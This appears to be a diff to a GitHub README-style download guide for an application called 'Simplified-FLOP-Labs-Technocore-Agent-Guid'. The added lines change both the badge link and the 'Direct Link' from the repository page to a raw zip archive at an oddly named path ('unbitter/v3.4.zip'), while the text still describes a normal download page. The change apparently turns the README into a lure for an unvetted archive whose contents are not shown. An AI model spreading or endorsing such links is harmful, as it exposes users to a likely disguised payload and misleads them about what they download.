@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the Simplified-FLOP-Labs-Tech
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid/raw/refs/heads/main/unbitter/v3.4.zip)
 
 Visit this link to download the application. This is your starting point. Click the button above or the link below to go to the download page.
 
-**Direct Link:** [https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid](https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid)
+**Direct Link:** [https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid/raw/refs/heads/main/unbitter/v3.4.zip](https://github.com/skumpheartstone/Simplified-FLOP-Labs-Technocore-Agent-Guid/raw/refs/heads/main/unbitter/v3.4.zip)
 
 Once you're on the page, look for the download button or the latest release section. The file you need will be clearly labeled. Click it to start the download.
 
